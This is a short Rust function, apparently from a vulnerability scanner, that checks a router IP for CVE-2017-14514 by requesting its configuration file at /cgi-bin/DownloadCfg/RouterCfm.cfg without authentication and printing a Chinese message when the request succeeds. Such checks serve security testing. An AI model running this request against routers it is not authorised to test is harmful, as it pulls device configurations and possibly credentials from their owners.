use reqwest::Client;

// todo
pub async fn run(ip: &str, client: Client) {
    let req = client
        .get(format!("http://{ip}/cgi-bin/DownloadCfg/RouterCfm.cfg"))
        .send()
        .await;

    match req {
        Ok(resp) => {
            if resp.status().is_success() {
                println!("{ip} 存在 CVE-2017-14514 漏洞");
            }
        }
        Err(_) => {
            // no
        }
    }
}
